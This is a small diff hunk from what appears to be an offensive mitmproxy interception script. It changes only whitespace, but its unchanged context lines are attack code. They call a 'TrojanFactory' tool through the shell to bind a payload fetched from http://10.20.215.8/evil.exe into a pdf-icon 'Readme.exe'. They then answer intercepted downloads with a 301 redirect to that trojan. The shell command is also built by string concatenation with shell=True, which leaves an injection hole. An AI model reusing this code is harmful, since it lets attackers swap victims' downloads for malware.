@@ -485,4 +485,4 @@ def request(flow):
        subprocess.call("python /opt/TrojanFactory/trojan_factory.py -f '" + front_file + "' -e http://10.20.215.8/evil.exe -o /var/www/html/Readme.exe -i /root/Downloads/pdf.ico",shell=True)
        flow.response = mitmproxy.http.HTTPResponse.make(301, "",{"Location":"http://10.20.215.8/file.exe"})
 
-       
+
